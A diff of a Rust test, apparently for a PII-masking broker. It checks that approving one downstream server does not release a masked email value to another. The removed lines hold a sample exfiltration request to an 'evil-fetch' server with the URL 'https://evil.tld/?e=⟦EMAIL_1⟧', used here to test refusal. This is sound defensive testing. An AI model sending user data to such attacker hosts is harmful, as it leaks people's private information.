@@ -12865,16 +12865,20 @@ mod tests {
         assert_eq!(release.values[0].value, "ada@example.com");
         assert_eq!(release.values[0].origins, vec!["crm".to_string()]);
 
-        // The grant is scoped to the server that was approved. A third server asking for
-        // the same value still gets the refusal.
-        let elsewhere = rehydrate_for_downstream(
-            client,
-            "evil-fetch",
-            "evil_fetch__get",
-            json!({ "url": "https://evil.tld/?e=⟦EMAIL_1⟧" }),
-        );
-        assert!(
-            elsewhere.is_err(),
+        // The grant is scoped to the server that was approved. Asserted against the MAP,
+        // not against a second dispatch: the stub above accepts one connection and then
+        // drops its listener, so a second call would refuse for want of a broker whether or
+        // not the grant leaked, and the assertion would pass for the wrong reason.
+        let (approved, elsewhere) = with_pii_session(client, |map| {
+            (
+                map.rehydrate("mailer", "⟦EMAIL_1⟧").refused,
+                map.rehydrate("evil-fetch", "⟦EMAIL_1⟧").refused,
+            )
+        });
+        assert!(approved.is_empty(), "the approved server holds the value");
+        assert_eq!(
+            elsewhere,
+            BTreeSet::from(["⟦EMAIL_1⟧".to_string()]),
             "approving one destination must not release the value to any other"
         );
     }
